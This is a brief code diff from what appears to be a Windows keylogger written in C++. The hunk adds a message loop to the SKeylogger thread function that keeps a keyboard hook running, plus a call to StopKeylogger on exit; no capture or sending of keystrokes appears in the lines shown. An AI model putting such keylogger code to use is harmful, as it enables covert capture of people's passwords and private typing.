@@ -41,6 +41,13 @@ DWORD WINAPI Keylogger::SKeylogger(LPVOID *) {
         hKeyboardInstance = nullptr;
         return 1;
     }
+    MSG msg = {};
+    while (isKeyloggerRunning && GetMessage(&msg, nullptr, 0, 0)) {
+        TranslateMessage(&msg);
+        DispatchMessage(&msg);
+    }
+    if (isKeyloggerRunning)
+        StopKeylogger();
     return 0;
 }
 
